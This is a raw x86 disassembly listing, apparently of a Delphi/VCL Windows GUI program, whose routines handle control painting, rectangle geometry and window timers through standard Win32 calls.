cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax [ ebp + ebx * 4 - 0x55 ]
jb r-xdata
add ebx [ eax - 0x13fc5478 ]
inc ecx
popfd
stosd [ edi ]
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
in al 0xc2
test eax 0xab82bc03
add esi [ eax - 0x37 ]
test eax 0xab881403
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
popad
insb
cld
jne r-xdata
inc ebp
js r-xdata
sbb [ edi + 0x8000503 ] cl
add edi [ eax ]
add [ eax ] al
sub_3a9a85e
mov eax 0x103a9c2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0xa9a8c472
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
test eax 0x3a9
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffcc03a9a9 ]
test eax 0x26c03a9
add [ eax ] al
and [ ecx + 0x3df003aa ] bh
test al 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add ebp [ edx + edx * 2 ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax [ ebp + ebx * 4 - 0x55 ]
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
add ebx [ eax - 0x13fc5478 ]
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
in al 0xc2
test eax 0xab82bc03
add esi [ eax - 0x37 ]
test eax 0xab881403
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
popfd
stosd [ edi ]
sub_3a9ab7f
test eax 0x103
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
push cs
add [ ecx ] cl
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
insb
lahf
stosb [ edi ]
add esp [ ecx ]
add bh bh
js r-xdata
or [ ecx + 0x6c ] eax
stosb [ edi ]
add edx [ ebp + ebp * 8 + 0x3aa ]
add [ eax + 0x3 ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
add al 0x8b
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ebx [ eax + eax ]
jmp [ eax ]
add [ eax + 0x42080016 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
mov cl 0xaa
add esp [ eax + 0x2 ]
add bh bh
movsb [ edi ] [ esi ]
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop edx
add al [ eax ]
[ edi + eax * 8 - 0x57 ]
sub_3a9b494
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_3a89828
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_3a89fcc
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_3a89828
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_3a89fcc
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9b558
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_3a89944
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_3a9b494
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_3a9b5b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3ab9264
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8c140
mov esi eax
mov [ ebx + 0x198 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_3a9bb18
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc6
call sub_3a64594
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_3aaf2ac
mov edx 0x69
mov eax ebx
call sub_3aaf278
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9b650
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x198 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ab92c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a9b680
push esi
xor edx edx
mov ecx [ eax + 0x198 ]
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
mov eax edx
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_3a9b6a0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x198 ]
call sub_3a8c620
mov esi eax
mov eax [ ebx + 0x198 ]
call sub_3a8c638
mov edi eax
mov eax ebx
call sub_3aaf4fc
mov [ esp ] eax
mov eax ebx
call sub_3aaf540
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x1a8 ] 0x0
jne r-xdata
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_3a63424
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_3a63424
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_3a63424
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_3a63424
mov esi eax
jmp r-xdata
sub_3a9b7cc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a9b6a0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_3a8a340
lea edx [ ebp - 0x18 ]
mov ecx 0x2
call sub_3a90f50
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a9b865
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a8a3c8
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a9b6a0
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x198 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_3a8a050
lea edx [ ebp - 0x18 ]
mov cl 0xff
mov eax [ ebp - 0x8 ]
call sub_3a91048
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9b86c
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_3a90fdc
retn
sub_3a9b874
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1ac ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1ac ] 0x1
xor edx edx
push ebp
push sub_3a9b992
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_3a91b8c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x190 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_3a8990c
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_3a89c5c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3a8a008
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
mov al 0x1
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac463c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x190 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_3a9b6a0
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_3a8a050
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
call sub_3a9b7cc
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3ad0d70
call sub_3ad105c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9b999
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x1ac ] dl
retn
mov eax ebx
call sub_3ad0d70
mov edx [ ebp - 0x4 ]
call sub_3ad1094
test al al
jne r-xdata
mov al 0x1
sub_3a9b9a0
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x198 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov dl 0x1
mov eax ebp
call sub_3ac463c
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x276 ] 0x0
je r-xdata
mov eax edi
call sub_3ab7fd8
test al al
je r-xdata
cmp [ ebp + 0x1ac ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_3ab7c38
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_3ab0e78
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_3a9ba3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x1aa ] bl
je r-xdata
cmp [ esi + 0x1a2 ] 0x0
je r-xdata
mov eax esi
call sub_3a9b9a0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
movzx eax [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
movzx ecx [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x1a4 ]
call [ esi + 0x1a0 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
jmp r-xdata
sub_3a9bb18
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
mov ebx [ eax + 0xc ]
test ebx ebx
je r-xdata
mov eax [ esi + 0x198 ]
call sub_3a8c620
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
mov eax [ esi + 0x198 ]
call sub_3a8c638
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov edx esp
mov eax esi
call sub_3a9b6a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
mov eax [ esi + 0x198 ]
call sub_3a8c620
push eax
mov eax [ esi + 0x198 ]
call sub_3a8c638
push eax
mov ecx [ esi + 0x44 ]
mov edx [ esi + 0x40 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
movzx edx [ esi + 0x1ab ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ esi + 0x1ac ] 0x0
jne r-xdata
cmp [ esi + 0x1ac ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esi + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esi + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
call sub_3a9b9a0
test al al
je r-xdata
sub_3a9bc44
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
movzx eax [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x198 ]
call sub_3a8c620
test eax eax
jle r-xdata
mov eax [ esi + 0x198 ]
call sub_3a8c620
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x198 ]
call sub_3a8c638
test eax eax
jle r-xdata
mov eax [ esi + 0x198 ]
call sub_3a8c638
mov [ ebp ] eax
movzx eax [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_3a9bcac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ab9264
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x198 ] 0x0
mov [ esi + 0x199 ] 0x0
mov edx 0x32
mov eax esi
call sub_3aaf278
mov edx 0x32
mov eax esi
call sub_3aaf2ac
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9bd58
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x190 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_3a89828
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_3a78df4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_3a78df4
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_3a78df4
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_3a89fcc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_3a89828
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_3a78df4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_3a78df4
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_3a78df4
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_3a89fcc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9be48
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x190 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_3a89828
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a89fa0
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_3a89f40
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_3a9be88
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_3a89944
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x199 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_3a8990c
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_3a898f0
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_3a89828
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_3a89c5c
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_3a8990c
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_3a898f0
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_3a89828
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_3a89c5c
mov eax [ ebp - 0x4 ]
call sub_3aaf4fc
push eax
mov eax [ ebp - 0x4 ]
call sub_3aaf540
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3a8a008
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_3a9bf7a ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x199 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_3a78e1c
lea eax [ ebp - 0x1c ]
call sub_3a9bd58
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_3a78e1c
lea eax [ ebp - 0x1c ]
call sub_3a9bd58
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_3a78e1c
lea eax [ ebp - 0x1c ]
call sub_3a9bd58
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_3a9be48
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_3a9be48
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_3a9be48
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_3a9be48
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_3a9be48
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_3a9be48
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_3a9be48
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_3a9be48
pop ecx
sub_3a9c110
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a83664
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_3a9c198
call sub_3a847e0
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9c160
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_3a9c20c
mov eax [ esi + 0x34 ]
call sub_3a84894
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a836b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a9c198
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_3a9c1d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9c20c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3a9c28b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9c292
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
sub_3a9c2e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ab9ce8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov edx 0xb9
mov eax esi
call sub_3aaf278
mov edx 0x29
mov eax esi
call sub_3aaf2ac
mov [ esi + 0x268 ] 0x2
mov [ esi + 0x269 ] 0x2
mov dl 0x2
mov eax esi
call sub_3a9c76c
